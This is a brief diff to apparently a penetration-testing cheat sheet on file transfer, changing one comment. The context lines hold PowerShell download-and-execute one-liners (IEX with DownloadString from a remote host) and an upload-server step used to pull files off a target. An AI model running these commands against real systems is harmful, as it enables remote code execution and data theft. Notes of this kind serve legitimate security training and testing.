@@ -93,7 +93,7 @@ IEX(New-Object Net.WebClient).DownloadString('ftp://example.com/test.ps1')
 # Start the UPLOAD server
 python3 -m uploadserver
 
-# Transfer/import module (PSUpload.ps1)
+# Download to the target machine
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 
 # Upload the file
